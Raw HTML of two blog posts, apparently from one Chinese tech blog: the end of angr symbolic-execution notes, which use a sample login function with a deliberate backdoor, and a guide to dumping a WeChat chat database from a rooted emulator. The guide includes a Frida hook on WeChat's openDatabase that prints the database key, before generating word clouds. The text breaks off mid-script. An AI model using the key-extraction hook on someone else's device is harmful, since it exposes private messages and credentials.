href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h3><p>这里和z3比较像，通过加入一些限制条件，计算出在此条件下可以得到结果的输入。下面就是一个简单的解方程。</p><p><img src="/2023/08/01/angr-basic/image-20230801150132640.png" alt="image-20230801150132640"></p><p>通过检查state.satisfiable()可以砍断state是否可解</p><p><img src="/2023/08/01/angr-basic/image-20230801150313209.png" alt="image-20230801150313209"></p><p>注意到上述只采用<code>eval</code>作为求解方式，我们也可以使用别的，如下。</p><p><img src="/2023/08/01/angr-basic/image-20230801150406295.png" alt="image-20230801150406295"></p><h2 id="模拟运行的内存-、寄存器"><a href="#模拟运行的内存-、寄存器" class="headerlink" title="模拟运行的内存 、寄存器"></a>模拟运行的内存 、寄存器</h2><p>angr提供了非常方便的内存操作，如下。<code>resolved</code>表示获取某个内存或者寄存器中的数值。</p><p><img src="/2023/08/01/angr-basic/image-20230802120614747.png" alt="image-20230802120614747"></p><p>angr再碰到分支语句时，会产生两种不同的state，并且用符号来表示每一种state的限制。下面是一个例子，源代码如下，是一个含有后门的验证函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">authenticate</span><span class="params">(<span class="type">char</span> *username, <span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> stored_pw[<span class="number">9</span>];</span><br><span class="line">stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> pwfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">// evil back d00r</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">pwfile = open(username, O_RDONLY);</span><br><span class="line">read(pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的，我们可以查看在不同分支语句下(这里就是strcmp语句所在的if会产生两个分支)，然后查看其中的内存。单步运行直到产生分支语句，之后使用<code>eval</code>或者<code>dump</code>可以获得到达每个分支的约束条件</p><p><img src="/2023/08/01/angr-basic/image-20230802123216589.png" alt="image-20230802123216589"></p><p><img src="/2023/08/01/angr-basic/image-20230802123940509.png" alt="image-20230802123940509"></p><h3 id="不同的states"><a href="#不同的states" class="headerlink" title="不同的states"></a>不同的states</h3><p>在上面的例子中，我们使用<code>entry_state</code>来创建了一个指向二进制程序入口点的<code>state</code>。此外，还有以下几种不同的states。</p><ul><li>.blank_state()，创建一个大多数数据都没有被初始化的state，这个时候所有访问数据都会返回<code>uninitialized</code>。(不清楚是干什么用的)</li><li>.entry_state()，建立一个可以运行binary的entry point的state</li><li>.full_init_state()，首先完成一系列初始化工作，例如加载动态链接库等，之后再指向<code>entry</code>。</li><li>.call_state()，建立一个准备好执行指定函数的状态(这个可能很有用，可以单独测试函数)</li></ul><p>为了初始化上述state，可以执行以下参数</p><ul><li>地址，不多说了</li><li><code>argc,argv</code>，也就是命令行参数，可以通过env的一个list传递给上述states。</li><li>参数，在调用<code>call_state</code>时，使用<code>.call_state(addr, arg1, arg2, ...)</code>。addr是指被调用函数的地址，如果要传入指针，需要用到例如<code>angr.PointerWrapper(&quot;point to me!&quot;)</code>。</li></ul><h3 id="state-option"><a href="#state-option" class="headerlink" title="state option"></a>state option</h3><p>对于不同状态的处理，angr提供了一些有用的option。<a href="https://docs.angr.io/en/latest/appendix/options.html#options">List of State Options - angr documentation</a>例如</p><ul><li>LAZY_SOLVES, 直到执行完全之后才检查是否满足可解的约束</li><li>ABSTRACT_SOLVER， 允许简化过程中分离约束</li></ul><p>此外，有一些options sets，里面包含了很多功能类似的options。例如</p><ul><li>simplification: 在运算过程中使用z3的优化</li><li>refs, 疾苦angr的mem，reg等内容的记录</li></ul><p>使用如下命令开启或者关闭options。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This change to the settings will be propagated to all successor states created from this state after this line.</span></span><br><span class="line">s.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"><span class="comment"># Create a new state with lazy solves enabled</span></span><br><span class="line">s = proj.factory.entry_state(add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"><span class="comment"># Create a new state without simplification options enabled</span></span><br><span class="line">s = proj.factory.entry_state(remove_options=angr.options.simplification)</span><br></pre></td></tr></table></figure><h3 id="state-plugins"><a href="#state-plugins" class="headerlink" title="state plugins"></a>state plugins</h3><p>之前讲到的mem,regs,solvers等，都是state plugins的一部分。此外，还有history和callstack插件，可以用来查看函数调用的特征。</p><p><a href="https://docs.angr.io/en/latest/core-concepts/states.html#state-plugins">Machine State - memory, registers, and so on - angr documentation</a></p><p>state也支持merging，将两个状态合并并不会发生覆盖，而是使变量变为<em>既A又B</em>的状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># merge will return a tuple. the first element is the merged state</span></span><br><span class="line"><span class="comment"># the second element is a symbolic variable describing a state flag</span></span><br><span class="line"><span class="comment"># the third element is a boolean describing whether any merging was done</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(s_merged, m, anything_merged) = s1.merge(s2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is now an expression that can resolve to &quot;AAAA&quot; *or* &quot;BBBB&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaaa_or_bbbb = s_merged.mem[<span class="number">0x1000</span>].uint32_t</span><br></pre></td></tr></table></figure><h2 id="sumulation-managers"><a href="#sumulation-managers" class="headerlink" title="sumulation managers"></a>sumulation managers</h2><p>在模拟运行过程中，由<code>simulation manager</code>管理各个状态。如下所示(懒得翻译了==)这里的stash就是一些满足特定状态的state的集合。</p><p><img src="/2023/08/01/angr-basic/image-20230802135304163.png" alt="image-20230802135304163"></p><p>这里也提到一个<code>explore</code>大法。通过explore，并指定find=addr时，可以找到所有能够到达某地址的执行流程，放入<code>found</code> stash中，也可以指定<code>avoid</code>参数，那么也会有一个avoid stash。</p><p><img src="/2023/08/01/angr-basic/image-20230802135840129.png" alt="image-20230802135840129"></p><p><img src="/2023/08/01/angr-basic/image-20230802135939986.png" alt="image-20230802135939986"></p><p>我们也可以通过插件的方式指定simulation manager的行为。使用<code>simgr.use_technique(tech)</code>来指定tech，从而实现定制化模拟执行方式(?)，一些可选项例如DFS，内存监视(防止剩余内存过少),spiller用来在active内存过多的时候放弃一些，防止占用过大等。<a href="https://docs.angr.io/en/latest/core-concepts/pathgroups.html#exploration-techniques">Simulation Managers - angr documentation</a></p><h3 id="模拟和插桩"><a href="#模拟和插桩" class="headerlink" title="模拟和插桩"></a>模拟和插桩</h3><h3 id="successor的属性"><a href="#successor的属性" class="headerlink" title="successor的属性"></a>successor的属性</h3><p>在模拟运行中，我们可以设置一系列断点和监视点。在模拟过程中，successor有一些属性，例如<code>unsat_successors</code>表示这个后继block不能满足他的前置约束条件，<code>flat_successors</code>表示由于符号化指针的出现，需要堆此successor进行一个up to 256的可能结果计算。</p><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>在angr中，可以很方便的对寄存器、内存读写、系统调用等进行插桩，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This will break before a memory write if 0x1000 is a possible value of its target expression</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, mem_write_address=<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This will break before a memory write if 0x1000 is the *only* value of its target expression</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, mem_write_address=<span class="number">0x1000</span>, mem_write_address_unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This will break after instruction 0x8000, but only 0x1000 is a possible value of the last expression that was read from memory</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;instruction&#x27;</span>, when=angr.BP_AFTER, instruction=<span class="number">0x8000</span>, mem_read_expr=<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>例如我们想去分析所有websgetvar()函数，一般而言对于arm，mips来说是直接对寄存器指向的地址写入，那么可以先识别接受输入的api(或许这就是signature的作用！)，之后设置观察点来debug。我们还可以设置条件断点，下面是条件断点的一个例子，他判断当前状态的寄存器rax是否是AAAA，不过应该指的是内存中的rax指向的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this is a complex condition that could do anything! In this case, it makes sure that RAX is 0x41414141 and</span></span><br><span class="line"><span class="comment"># that the basic block starting at 0x8004 was executed sometime in this path&#x27;s history</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">cond</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> state.<span class="built_in">eval</span>(state.regs.rax, cast_to=<span class="built_in">str</span>) == <span class="string">&#x27;AAAA&#x27;</span> <span class="keyword">and</span> <span class="number">0x8004</span> <span class="keyword">in</span> state.inspect.backtrace</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, condition=cond)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>这里主要是如何用angr写自己的分析框架。这一部分放到单独一篇来写！<a href="https://docs.angr.io/en/latest/extending-angr/analysis_writing.html#writing-analyses">Writing Analyses - angr documentation</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>阅读完angr core，了解到angr<strong>本质上是一个模拟器</strong>，是一个静态的模拟器，给我的感觉类似于一个支持多架构翻译的虚拟机，并且在得到虚拟机的指令内容之后，可以利用符号的方式模拟执行(simulate)，并在分支位置设置新的状态(state)。每一个状态就是程序执行到某一个汇编位置时的观察点，代表了某一时刻程序的状态。</p><p>在此基础上，angr设置了断点、约束求解、函数hook等等方便我们对观察点位置的程序进行分析的工具。我的目的是backward taint analysis，目前看来angr没有提供很好的接口，需要后续自己尝试</p>]]></content>
      
      
      <categories>
          
          <category> rev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>decrypt-wechat-db</title>
      <link href="/2023/05/03/decrypt-wechat-db/"/>
      <url>/2023/05/03/decrypt-wechat-db/</url>
      
        <content type="html"><![CDATA[<p>最近几天做了一个提取微信聊天，做成词云的工具，记录在这里，防止忘记~</p><span id="more"></span><h2 id="step1-提取微信聊天数据库"><a href="#step1-提取微信聊天数据库" class="headerlink" title="step1 提取微信聊天数据库"></a>step1 提取微信聊天数据库</h2><p>这一步最好的方式是通过电脑版微信，备份手机微信，之后再用安卓模拟器重新载入聊天记录，获取聊天记录的db文件。</p><p>电脑板微信点击下面，迁移与备份</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503205907647.png" alt="image-20230503205907647"></p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503205947393.png" alt="image-20230503205947393"></p><p>这里要注意！如果出现”网络情况复杂，请稍后再试“，无论是不是用同一网络都不行！</p><p>此时需要进入网络设置，禁用VMWARE的虚拟网卡。</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503210126549.png" alt="image-20230503210126549"></p><p>之后在手机上面，选择想要生成词云的人的消息记录，导出到电脑即可。注意这里比较坑，一旦模拟器登录，电脑就会登出，而电脑登陆又要手机扫码。。解决办法是在模拟器里扫码，直接用模拟器的扫一扫，把微信的二维码扫一下就可以了。</p><p>之后下载安卓模拟器。我在夜神模拟器7.0.5.6测试可以成功。在夜神模拟器中导入此聊天记录(漫长的等待)</p><p>导入之后，需要在root模式下，进入文件管理器，找到对应数据库文件。这里的路径是**/data/data/com.tencent.mm/MicroMsg**。注意不需要下载什么文件管理器，直接用夜神模拟器自带的文件管理系统就可以了。</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503210609793.png" alt="image-20230503210609793"></p><p>点了这个文件助手之后，需要设置一个电脑共享路径。这样就可以在模拟器和主机之间，直接通过文件系统传递文件。</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503210635808.png" alt="image-20230503210635808"></p><p>之后找到上述路径。看到这里有一个很长的文件夹名字。(如果有多个，选择最近修改的那个)点进去。这里就是5014…的文件夹</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503210839019.png" alt="image-20230503210839019"></p><p>找到其中的<code>EnMicroMsg.db</code>。将他复制出来。方法就是点击文件最右边的三个点，选择复制，粘贴到和电脑的共享路径就可以了。</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503211015472.png" alt="image-20230503211015472"></p><p>导出之后需要安装一个<code>sqlcipher.exe</code>。这个原版的网上找不到了，大家也可以自己下载开源的，这里我直接放一个<a href="https://github.com/Nicholas-wei/slides/blob/master/sqlcipher.exe">exe文件</a>，大家放心的话可以直接下载来用</p><h2 id="step2解密数据库密码"><a href="#step2解密数据库密码" class="headerlink" title="step2解密数据库密码"></a>step2解密数据库密码</h2><p>将之前导出的db文件放入sqlcipher.exe，发现文件是加密的。需要输入密码。网上对于这个密码有很多说法，什么uid，什么默认密码。但是现在都不一定对。一个比较推荐的方法是通过fridahook，提取出密码。</p><p>首先需要在模拟器和电脑上安装frida。模拟器上安装需要首先<a href="https://www.yeshen.com/faqs/H15tDZ6YW">安装adb</a>。安装frida可以参考<a href="https://www.jianshu.com/p/c349471bdef7">这篇文章</a>。注意要在模拟器里面下载的是server。并且如果是模拟器，要下载x86架构的。之后在电脑上安装python的frida环境。在一切准备就绪之后，可以用下面的脚本hook微信数据库解密db时用到的密码。可以参考<a href="https://www.cnblogs.com/lxh2cwl/p/14842479.html">此链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida </span><br><span class="line"><span class="keyword">import</span> sys   </span><br><span class="line"> </span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123; </span></span><br><span class="line"><span class="string">        var utils = Java.use(&quot;com.tencent.wcdb.database.SQLiteDatabase&quot;); // 类的加载路径</span></span><br><span class="line"><span class="string">         </span></span><br><span class="line"><span class="string">        utils.openDatabase.overload(&#x27;java.lang.String&#x27;, &#x27;[B&#x27;, &#x27;com.tencent.wcdb.database.SQLiteCipherSpec&#x27;, &#x27;com.tencent.wcdb.database.SQLiteDatabase$CursorFactory&#x27;, &#x27;int&#x27;, &#x27;com.tencent.wcdb.DatabaseErrorHandler&#x27;, &#x27;int&#x27;).implementation = function(a,b,c,d,e,f,g)&#123;  </span></span><br><span class="line"><span class="string">            console.log(&quot;Hook start......&quot;);</span></span><br><span class="line"><span class="string">            var JavaString = Java.use(&quot;java.lang.String&quot;);</span></span><br><span class="line"><span class="string">            var database = this.openDatabase(a,b,c,d,e,f,g);</span></span><br><span class="line"><span class="string">            send(a);</span></span><br><span class="line"><span class="string">            console.log(JavaString.$new(b));</span></span><br><span class="line"><span class="string">            send(&quot;Hook ending......&quot;);</span></span><br><span class="line"><span class="string">            return database;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">         </span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message,data</span>): <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&quot;payload&quot;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">     </span><br><span class="line">process = frida.get_remote_device()</span><br><span class="line">pid = process.spawn([<span class="string">&#x27;com.tencent.mm&#x27;</span>]) <span class="comment">#spawn函数：进程启动的瞬间就会调用该函数</span></span><br><span class="line">session = process.attach(pid)  <span class="comment"># 加载进程号</span></span><br><span class="line">script = session.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">process.resume(pid)  <span class="comment"># 重启app</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行之后即获得数据库解密密码。如果到时候API变了，也可以用类似的方法hook一遍。</p><h2 id="step3生成词云"><a href="#step3生成词云" class="headerlink" title="step3生成词云"></a>step3生成词云</h2><p>在打开db之后，需要找到<strong>message</strong>这个数据库(没有什么好办法，一行一行找的)选中，导出成csv文件</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503213544269.png" alt="image-20230503213544269"></p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503213625702.png" alt="image-20230503213625702"></p><p>之后就有一个excel文件，找到里面的<code>content</code>，就对应了发的消息的内容~</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503213713834.png" alt="image-20230503213713834"></p><p>把这些全部复制出来就可以啦。接下来要生成词云</p><h3 id="3-1过滤"><a href="#3-1过滤" class="headerlink" title="3.1过滤"></a>3.1过滤</h3><p>过滤消息中的乱码之类的。我通过以下脚本实现。其中<code>message.txt</code>是原本的消息，<code>fliter_msg.txt</code>是过滤之后的消息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fin = <span class="built_in">open</span>(<span class="string">&quot;message.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">fout = <span class="built_in">open</span>(<span class="string">&quot;fliter_msg.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">stop = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;wxid&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;撤回&quot;</span>,<span class="string">&quot;&amp;&quot;</span>]</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    bad = <span class="number">0</span></span><br><span class="line">    i =  fin.readline()</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> i):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> stop:</span><br><span class="line">        <span class="keyword">if</span>(i.find(j)!=-<span class="number">1</span>):</span><br><span class="line">            bad = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> bad):</span><br><span class="line">        fout.write(i)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(cnt % <span class="number">100</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now process &#123;&#125;&quot;</span>, cnt)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure><h3 id="3-2-分词"><a href="#3-2-分词" class="headerlink" title="3.2 分词"></a>3.2 分词</h3><p>这一步我用了jieba的paddle模式。可能会比直接用jieba更好一些? 安装过程如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install jieba</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">旧版本升级</span></span><br><span class="line">pip install jieba --upgrade</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用paddle模式：结巴版本大于0.4且安装paddlepaddle-tiny模块</span></span><br><span class="line">pip install paddlepaddle-tiny==1.6.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> jieba.posseg <span class="keyword">as</span> pseg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fin = open(&quot;fliter_msg_small.txt&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;)</span></span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">&quot;fliter_msg.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">fout_noun = <span class="built_in">open</span>(<span class="string">&quot;fliter_msg_noun.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">fout_adj = <span class="built_in">open</span>(<span class="string">&quot;fliter_msg_adj.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">content = fin.read()</span><br><span class="line">jieba.enable_paddle() <span class="comment">#启动paddle模式。</span></span><br><span class="line">words = pseg.cut(content,use_paddle=<span class="literal">True</span>) <span class="comment">#paddle模式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;paddle模式&#x27;</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> word, flag <span class="keyword">in</span> words:</span><br><span class="line">    cnt +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> flag == <span class="string">&quot;nr&quot;</span> <span class="keyword">or</span> flag == <span class="string">&quot;nz&quot;</span>):</span><br><span class="line">        <span class="comment"># print(&#x27;%s %s&#x27; % (word, flag))</span></span><br><span class="line">        fout_noun.write(word)</span><br><span class="line">        fout_noun.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="string">&quot;a&quot;</span> <span class="keyword">or</span> flag == <span class="string">&quot;ad&quot;</span>):</span><br><span class="line">        fout_adj.write(word)</span><br><span class="line">        fout_adj.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(cnt % <span class="number">100000</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now process &#123;&#125;&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line">fin.close()</span><br><span class="line">fout_noun.close()</span><br><span class="line">fout_adj.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>*<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>之后生成两个文件<code>fliter_msg_noun.txt</code>代表名词，<code>fliter_msg_adj.txt</code>代表形容词。</p><h3 id="3-3生成词云"><a href="#3-3生成词云" class="headerlink" title="3.3生成词云"></a>3.3生成词云</h3><p>这里可以直接用wordcloud库。代码也很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例代码</span></span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;fliter_msg.txt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中文分词</span></span><br><span class="line">text = <span class="string">&#x27; &#x27;</span>.join(jieba.cut(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成对象</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;./background/pkq.jpg&quot;</span>) <span class="comment"># 打开遮罩图片</span></span><br><span class="line"></span><br><span class="line">mask = np.array(img) <span class="comment">#将图片转换为数组</span></span><br><span class="line"></span><br><span class="line">stopwords = [<span class="string">&quot;我&quot;</span>,<span class="string">&quot;你&quot;</span>,<span class="string">&quot;她&quot;</span>,<span class="string">&quot;的&quot;</span>,<span class="string">&quot;是&quot;</span>,<span class="string">&quot;了&quot;</span>,<span class="string">&quot;在&quot;</span>,<span class="string">&quot;也&quot;</span>,<span class="string">&quot;和&quot;</span>,<span class="string">&quot;就&quot;</span>,<span class="string">&quot;都&quot;</span>,<span class="string">&quot;这&quot;</span>,<span class="string">&quot;好&quot;</span>,<span class="string">&quot;啊&quot;</span>,<span class="string">&quot;吧&quot;</span>,<span class="string">&quot;吗&quot;</span>,<span class="string">&quot;嘛&quot;</span>]</span><br><span class="line">wc = WordCloud(font_path=<span class="string">&quot;./STFangSong.ttf&quot;</span>, <span class="comment"># 这个ttf文件可以上网自己找，我这里是宋体</span></span><br><span class="line">               mask=mask,</span><br><span class="line">               width = img.width,</span><br><span class="line">               height = img.height,</span><br><span class="line">               background_color=<span class="string">&#x27;white&#x27;</span>,</span><br><span class="line">               max_words=<span 